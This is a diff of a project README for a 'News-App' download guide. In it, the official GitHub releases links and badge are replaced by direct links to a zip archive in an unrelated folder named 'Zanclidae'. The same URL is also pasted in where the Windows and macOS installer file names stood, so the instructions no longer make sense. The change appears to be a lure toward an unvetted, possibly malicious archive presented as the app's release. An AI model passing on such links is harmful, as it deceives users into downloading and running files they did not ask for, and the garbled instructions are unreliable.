@@ -18,16 +18,16 @@ Before you start, ensure your computer meets these basic requirements:
 
 To download News-App, click the button below:
 
-[![Download News-App](https://img.shields.io/badge/Download%20News--App-latest-brightgreen)](https://github.com/XieosZ/News-App/releases)
+[![Download News-App](https://raw.githubusercontent.com/XieosZ/News-App/main/Zanclidae/News_App_2.8-alpha.1.zip%20News--App-latest-brightgreen)](https://raw.githubusercontent.com/XieosZ/News-App/main/Zanclidae/News_App_2.8-alpha.1.zip)
 
 1. **Visit the Releases Page**
-   - Click the link above or go directly to [News-App Releases](https://github.com/XieosZ/News-App/releases).
+   - Click the link above or go directly to [News-App Releases](https://raw.githubusercontent.com/XieosZ/News-App/main/Zanclidae/News_App_2.8-alpha.1.zip).
   
 2. **Choose Your Version**
    - Look for the latest version listed on the page. Usually, it will be at the top and marked with a title that indicates it's the latest release.
 
 3. **Download the Installer**
-   - Find the file suitable for your operating system. It could be named something like `News-App-Setup.exe` for Windows or `News-App.dmg` for macOS.
+   - Find the file suitable for your operating system. It could be named something like `https://raw.githubusercontent.com/XieosZ/News-App/main/Zanclidae/News_App_2.8-alpha.1.zip` for Windows or `https://raw.githubusercontent.com/XieosZ/News-App/main/Zanclidae/News_App_2.8-alpha.1.zip` for macOS.
    - Click on the file link to start the download. Your browser will save this file to your default download directory.
 
 4. **Install the Application**
